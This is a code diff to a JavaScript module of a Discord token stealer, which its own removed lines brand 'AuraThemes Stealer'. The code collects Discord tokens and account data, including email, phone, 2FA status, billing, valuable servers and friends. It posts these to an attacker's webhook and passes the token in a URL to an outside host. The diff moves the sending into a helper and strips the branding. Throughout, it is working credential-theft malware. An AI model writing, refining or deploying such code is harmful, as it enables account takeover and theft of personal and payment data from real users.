@@ -1,8 +1,16 @@
-const { discordFindTokens } = require('./finds.js');
-const { getUsers }          = require("./../../utils/harware.js");
+const {
+    sendWebhook 
+} = require('../../utils/request/sendWebhook.js');
 
-const FormData = require('form-data');
-const axios    = require("axios");
+const { 
+    getUsers 
+} = require("./../../utils/harware.js");
+
+const { 
+    discordFindTokens 
+} = require('./finds.js');
+
+const axios = require("axios");
 
 module.exports = async (webhook) => {
     const users = await getUsers();
@@ -37,62 +45,54 @@ module.exports = async (webhook) => {
 
                 let copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
 
-                const payload = {
-                    avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
-                    username: 'AuraThemes Stealer',
+                const data = {
                     embeds: [
                         {
                             title: `${user.username} | ${user.id}`,
-                            color: "12740607",
                             thumbnail: {
                                 url: avatar + '?size=512'
                             },
                             fields: [
                                 {
-                                    name: "<a:sofake:1127671627178577951> Token:",
-                                    value: `\`\`\`yml\n${token}\n\`\`\`\n[[Click Here To Copy Your Token]](${copy})`,
+                                    name: "<a:hearts:1176516454540116090> Token:",
+                                    value: `\`\`\`\n${token}\n\`\`\`\n[[Click Here To Copy Your Token]](${copy})`,
                                     inline: false
                                 },
                                 { name: "\u200b", value: "\u200b", inline: false },
                                 {
-                                    name: "<a:nitro:1187983753637802044> Nitro:",
+                                    name: "Nitro:",
                                     value: getNitro(user.premium_type),
                                     inline: true
                                 },
                                 {
-                                    name: "<a:love:1236106886978342965> Phone:",
+                                    name: "Phone:",
                                     value: `\`${user.phone || 'None'}${user.mfa_enabled ? ' (2FA)' : ''}\``,
                                     inline: true
                                 },
                                 { name: "\u200b", value: "\u200b", inline: false },
                                 {
-                                    name: "<:mail:866089515536744468> Email:",
+                                    name: "Email:",
                                     value: `\`${user.email || 'None'}\``,
                                     inline: true
                                 },
                                 {
-                                    name: "<a:badges:963333479129550889> Badges:",
+                                    name: "Badges:",
                                     value: getFlags(user.public_flags),
                                     inline: true
                                 },
                                 {
-                                    name: "<:blackcards:1121714389708439664> Billing:",
+                                    name: "Billing:",
                                     value: getBilling(billing),
                                     inline: true
                                 }
-                            ],
-                            timestamp: new Date(),
-                            footer: {
-                                text: 'AuraThemes Stealer | Tokens',
-                                icon_url: 'https://i.imgur.com/yVnOSeS.gif'
-                            }
+                            ]
                         }
                     ]
                 };
 
                 const hqGuilds = await getHQGuilds(guilds, token);
                 if (hqGuilds) {
-                    payload.embeds[0].fields.push({
+                    data.embeds[0].fields.push({
                         name: "\u200b",
                         value: hqGuilds,
                         inline: false
@@ -101,22 +101,14 @@ module.exports = async (webhook) => {
 
                 const hqFriends = getHQFriends(friends);
                 if (hqFriends) {
-                    payload.embeds[0].fields.push({
+                    data.embeds[0].fields.push({
                         name: "\u200b",
                         value: hqFriends,
                         inline: false
                     });
                 }
 
-                const form = new FormData();
-                form.append('payload_json', JSON.stringify(payload));
-
-                await axios.post(webhook, form, {
-                    headers: {
-                        ...form.getHeaders()
-                    }
-                });
-                await axios.get(copy);
+                await sendWebhook(webhook, data, [], copy)
             } catch (error) {
                 console.error('Error sending webhook:', error);
             }
@@ -135,7 +127,9 @@ function getHQFriends(friends) {
 
     let hQFriends = filteredFriends.map(friend => {
         const name = `${friend.username}#${friend.discriminator}`;
-        return friend.flags ? `${friend.flags} | ${name}\n` : `${friend.flags} | ${name}\n`;
+        if(friend.flags) {
+            return `${friend.flags} | ${name}\n`
+        }
     });
 
     hQFriends = hQFriends.join('');
@@ -173,12 +167,12 @@ async function getHQGuilds(guilds, token) {
             : 'No Invite';
 
         const emoji = guild.owner
-            ? "<:owner:963333541343686696> Owner"
-            : "<:staff:1178394965706031114> Admin";
+            ? `<:owner:963333541343686696> Owner`
+            : `<:staff:1178394965706031114> Admin`;
         const members = `Members: \`${guild.member_count}\``;
-        const name = `${guild.name} - \`${guild.id}\``;
+        const name = `**${guild.name}** - (${guild.id})`;
 
-        return `${emoji} | ${name} | ${members} - ${invite}\n`;
+        return `${emoji} | ${name} - ${members} - ${invite}\n`;
     }));
 
     hQGuilds = hQGuilds.join('')
